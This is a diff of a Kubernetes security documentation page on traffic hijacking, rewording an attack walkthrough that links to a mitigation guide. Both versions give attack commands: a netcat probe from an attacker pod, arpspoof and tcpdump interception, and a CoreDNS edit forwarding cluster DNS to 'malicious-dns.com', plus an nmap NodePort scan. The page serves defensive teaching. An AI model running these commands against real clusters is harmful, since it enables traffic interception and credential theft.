@@ -6,56 +6,60 @@ description: "How attackers manipulate Kubernetes network traffic to intercept, 
 
 # Traffic Hijacking
 
-**Traffic hijacking** in Kubernetes occurs when an attacker intercepts, redirects, or disrupts network traffic within the cluster. This can lead to **data exfiltration, man-in-the-middle (MITM) attacks, service downtime, and unauthorized access to sensitive information**.
+Traffic hijacking in Kubernetes occurs when an attacker intercepts or redirects network communication between workloads. This enables **data theft, service disruption, and man-in-the-middle (MITM) attacks**, especially in environments lacking network segmentation and traffic encryption.
 
 ---
 
 ## Exploitation Steps: Manipulating Kubernetes Network Traffic
 
-An attacker exploits **misconfigured network policies, insecure service exposure, or DNS manipulation** to hijack traffic.
+An attacker exploits **missing network policies, insecure service exposure, or DNS misconfigurations** to hijack traffic within the cluster.
 
-### Step 1: Exploit Missing Network Policies
+### 1. Exploit Missing Network Policies
 
-If network policies are not enforced, the attacker scans for open communication paths:
+The attacker checks if restrictive network policies are in place:
 
 ```bash
 kubectl get networkpolicies --all-namespaces
 ```
 
-If no restrictive policies exist, the attacker can access internal workloads:
+If none exist, they attempt lateral movement from a compromised pod:
 
 ```bash
 kubectl run attacker-pod --rm -it --image=alpine -- /bin/sh
 nc -zv <target-pod-ip> 443
 ```
 
-Without network segmentation, lateral movement between pods is possible.
+Without network segmentation, pods can communicate freely, enabling reconnaissance and access to sensitive services.
 
-### Step 2: Conduct a Man-in-the-Middle (MITM) Attack
+---
 
-If an attacker gains access to a compromised pod, they can intercept internal traffic using **ARP spoofing**:
+### 2. Perform Man-in-the-Middle (MITM) Attack
+
+From within a compromised pod, the attacker intercepts traffic using ARP spoofing:
 
 ```bash
 arpspoof -i eth0 -t <victim-ip> <gateway-ip>
 ```
 
-Or by using **tcpdump** to capture sensitive data:
+Or captures unencrypted data with:
 
 ```bash
 tcpdump -i eth0 -A port 443
 ```
 
-This allows the attacker to read and modify unencrypted traffic.
+This allows them to steal session data, secrets, or API credentials.
 
-### Step 3: Manipulate Kubernetes DNS
+---
 
-If **CoreDNS** is misconfigured, the attacker can modify DNS responses to redirect traffic:
+### 3. Manipulate DNS with Compromised CoreDNS
+
+If **CoreDNS** is misconfigured or lacks validation, the attacker injects rogue entries:
 
 ```bash
 kubectl edit configmap coredns -n kube-system
 ```
 
-By injecting a rogue DNS entry:
+Example modification:
 
 ```yaml
 .:53 {
@@ -63,28 +67,32 @@ forward . malicious-dns.com
 }
 ```
 
-All DNS queries in the cluster are now redirected to the attacker's controlled server.
+All DNS traffic is now redirected to attacker-controlled servers, enabling traffic rerouting or phishing.
 
-### Step 4: Abuse External Service Exposure
+---
 
-If services are exposed via **NodePort** or **LoadBalancer** without proper authentication, the attacker accesses internal workloads directly:
+### 4. Abuse Insecure External Service Exposure
+
+If services are exposed using NodePort or LoadBalancer without proper controls, the attacker scans for open ports:
 
 ```bash
 nmap -p 30000-32767 <cluster-node-ip>
 ```
 
-If a publicly exposed service is found, the attacker exploits it to extract sensitive data.
-
-### Result
-
-The attacker has successfully **intercepted, manipulated, or redirected cluster traffic**, leading to **data theft, unauthorized access, and service disruption**.
+Once found, they can access backend services without authentication and extract sensitive data directly.
 
 ---
 
-## Mitigation Steps
+### Result
 
-To protect against **traffic hijacking**, follow the security best practices outlined in:
+The attacker successfully intercepts or manipulates network traffic, leading to:
 
-➡ **[Securing Kubernetes Network Traffic](/docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation)**
+- **Unauthorized access to services and data**
+- **Intra-cluster lateral movement**
+- **Disrupted communications and workload instability**
 
-This guide covers techniques such as **enforcing network policies, securing CoreDNS, encrypting intra-cluster traffic, and restricting service exposure** to prevent unauthorized network manipulation.
+---
+
+## Mitigation
+
+➡ [Securing Kubernetes Network Traffic](/docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation)
